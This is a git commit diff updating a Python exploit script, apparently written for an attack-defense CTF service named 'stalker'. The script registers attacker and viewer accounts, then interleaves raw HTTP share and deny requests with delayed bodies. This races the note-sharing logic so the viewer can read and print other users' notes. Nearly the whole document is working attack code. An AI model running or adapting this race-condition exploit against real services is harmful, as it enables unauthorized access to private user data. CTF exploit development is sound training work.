eef68e0eb0fbf98109e5fde250bc9f0b1670f4f0
Vladimir <keltecc@ya.ru>
2023-04-22 13:34:55 +0300

    [stalker] update sploit

--- sploits/stalker/sploit.py
+++ sploits/stalker/sploit.py
@@ -5,7 +5,7 @@ import json
 import random
 import string
 import itertools
-from typing import Self, List, Set, Coroutine
+from typing import Self, List, Coroutine
 
 import asyncio
 import aiohttp
@@ -15,8 +15,6 @@ IP = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
 PORT = 17171
 
 TOKEN_HEADER_NAME = 'X-Token'
-
-VIEWED_NOTES: Set[str] = set()
 
 
 def random_string(length: int, alpha: str = string.ascii_lowercase + string.digits) -> str:
@@ -29,17 +27,19 @@ class Client:
     def __init__(self: Self) -> None:
         self.url = f'http://{IP}:{PORT}'
         self.token = 'x'
+        self.username = 'x'
+        self.password = 'x'
 
-    async def register(self: Self) -> str:
-        username = random_string(16)
-        password = random_string(32)
+    async def register(self: Self) -> None:
+        self.username = random_string(16)
+        self.password = random_string(32)
 
         async with aiohttp.ClientSession() as session:
             request = session.post(
                 self.url + '/users/register',
                 json = {
-                    'name': username,
-                    'password': password,
+                    'name': self.username,
+                    'password': self.password,
                 },
                 headers = {TOKEN_HEADER_NAME: self.token},
             )
@@ -47,8 +47,6 @@ class Client:
             async with request as response:
                 await response.text()
                 self.token = response.headers.get(TOKEN_HEADER_NAME)
-
-        return username
     
     async def note_get(self: Self, title: str) -> str:
         async with aiohttp.ClientSession() as session:
@@ -103,23 +101,37 @@ class Client:
                 return await response.text()
 
 
-async def note_steal_with_timeout(
-        attacker: Client, note_title: str, viewer_name: str, timeout: int,
-) -> bytes:
+async def do_attack(
+        wait: int, attacker: Client, viewer: Client, timeout: int,
+) -> None:
+    await asyncio.sleep(wait)
+
+    note_title = await attacker.note_create()
+
     obj = {
-        'viewer': viewer_name,
+        'viewer': viewer.username,
     }
     data = json.dumps(obj).encode()
 
-    reader, writer = await asyncio.open_connection(IP, PORT)
+    _, writer1 = await asyncio.open_connection(IP, PORT)
 
-    writer.write(f'POST /notes/{note_title}/share HTTP/1.1\r\n'.encode())
-    writer.write(f'Host: {IP}:{PORT}\r\n'.encode())
-    writer.write(f'{TOKEN_HEADER_NAME}: {attacker.token}\r\n'.encode())
-    writer.write(f'Content-Length: {len(data)}\r\n'.encode())
-    writer.write(b'Content-Type: application/json\r\n')
-    writer.write(b'\r\n')
-    await writer.drain()
+    writer1.write(f'POST /notes/{note_title}/share HTTP/1.1\r\n'.encode())
+    writer1.write(f'Host: {IP}:{PORT}\r\n'.encode())
+    writer1.write(f'{TOKEN_HEADER_NAME}: {attacker.token}\r\n'.encode())
+    writer1.write(f'Content-Length: {len(data)}\r\n'.encode())
+    writer1.write(b'Content-Type: application/json\r\n')
+    writer1.write(b'\r\n')
+    await writer1.drain()
+
+    _, writer2 = await asyncio.open_connection(IP, PORT)
+
+    writer2.write(f'POST /notes/{note_title}/deny HTTP/1.1\r\n'.encode())
+    writer2.write(f'Host: {IP}:{PORT}\r\n'.encode())
+    writer2.write(f'{TOKEN_HEADER_NAME}: {attacker.token}\r\n'.encode())
+    writer2.write(f'Content-Length: {len(data)}\r\n'.encode())
+    writer2.write(b'Content-Type: application/json\r\n')
+    writer2.write(b'\r\n')
+    await writer2.drain()
 
     # await asyncio.sleep(0.1)
 
@@ -127,38 +139,22 @@ async def note_steal_with_timeout(
 
     await asyncio.sleep(timeout)
 
-    writer.write(data)
-    await writer.drain()
+    writer1.write(data)
+    await writer1.drain()
 
-    response = await reader.read(65536)
+    writer1.close()
 
-    writer.close()
+    obj = await viewer.user_profile(viewer.username)
+    user = json.loads(obj)
 
-    return response
-
-
-async def do_attack(
-        wait: int, attacker: Client, viewer: Client, viewer_name: str, timeout: int,
-) -> None:
-    await asyncio.sleep(wait)
-
-    note_title = await attacker.note_create()
-
-    await note_steal_with_timeout(attacker, note_title, viewer_name, timeout)
-
-    # await asyncio.sleep(0.1)
-
-    raw = await viewer.user_profile(viewer_name)
-    profile = json.loads(raw)
-
-    for shared_note in profile['sharedNotes']:
-        if shared_note in VIEWED_NOTES:
-            continue
-
-        VIEWED_NOTES.add(shared_note)
-
+    for shared_note in user['sharedNotes']:
         note = await viewer.note_get(shared_note)
         print(note)
+
+    writer2.write(data)
+    await writer2.drain()
+
+    writer2.close()
 
 
 async def main() -> None:
@@ -166,12 +162,12 @@ async def main() -> None:
     timeout = 10
 
     attacker = Client()
-    attacker_name = await attacker.register()
-    print(f'registered attacker with name: {attacker_name}')
+    await attacker.register()
+    print(f'registered attacker with name: {attacker.username}')
 
     viewer = Client()
-    viewer_name = await viewer.register()
-    print(f'registered viewer with name: {viewer_name}')
+    await viewer.register()
+    print(f'registered viewer with name: {viewer.username}')
 
     for i in itertools.count():
         print(f'started {i} round with {count} attacks')
@@ -179,7 +175,7 @@ async def main() -> None:
         attacks: List[Coroutine] = []
 
         for i in range(count):
-            attack = do_attack(i, attacker, viewer, viewer_name, timeout)
+            attack = do_attack(i, attacker, viewer, timeout)
             attacks.append(attack)
 
         await asyncio.gather(*attacks)
